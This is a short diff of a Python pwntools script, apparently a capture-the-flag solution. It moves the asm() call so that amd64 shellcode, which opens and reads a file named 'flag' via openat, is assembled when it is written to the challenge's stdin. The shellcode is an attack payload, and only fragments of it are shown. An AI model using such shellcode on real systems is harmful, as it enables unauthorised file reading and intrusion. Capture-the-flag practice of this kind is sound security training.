@@ -1944,7 +1944,7 @@ from pwn import *
 context.arch = "amd64"
 context.log_level = "error"
 
-shellcode = asm(r"""
+shellcode = r"""
     /* openat(3, "flag", O_RDONLY) */
     mov rdi, 3
     lea rsi, [rip + path]
@@ -1968,11 +1968,11 @@ shellcode = asm(r"""
 
 path:
     .string "flag"
-""")
+"""
 
 # Send raw shellcode to stdin (the running challenge)
 import sys
-sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(asm(shellcode))
 ```
 
 ```
